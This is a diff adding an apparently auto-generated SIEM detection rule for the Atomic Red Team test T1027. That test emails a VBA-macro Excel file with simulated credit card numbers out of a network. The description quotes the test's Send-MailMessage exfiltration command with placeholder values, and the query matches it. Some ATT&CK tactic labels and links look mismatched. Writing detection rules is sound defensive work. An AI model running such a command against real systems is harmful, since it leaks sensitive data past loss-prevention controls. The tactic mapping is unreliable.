@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'DLP Evasion via Sensitive Data in VBA Macro over email' (GUID: 129edb75-d7b8-42cd-a8ba-1f3db64ec4ad) of technique T1027 (Obfuscated Files or Information). Test Description: Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.. Command/Steps: Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments \\\"#{input_file}\\\" -SmtpServer #{smtp_server}\n"
+from = "now-9m"
+rule_id = "454a3db2-c80c-4696-a354-c75b192a14db"
+language = "kql"
+name = "Atomic Test: T1027 - DLP Evasion via Sensitive Data in VBA Macro over email"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1027/T1027.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1027", "129edb75-d7b8-42cd-a8ba-1f3db64ec4ad", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*Send-MailMessage*\\\" AND powershell.script_block_text : \\\"*-From*\\\" AND powershell.script_block_text : \\\"*test@corp.com*\\\" OR (process.command_line : \\\"*Send-MailMessage*\\\" AND process.command_line : \\\"*-From*\\\" AND process.command_line : \\\"*test@corp.com*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1027"
+name = "DLP Evasion via Sensitive Data in VBA Macro over email"
+reference = "https://attack.mitre.org/techniques/T1027"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1027"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1027"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1027"
+
+
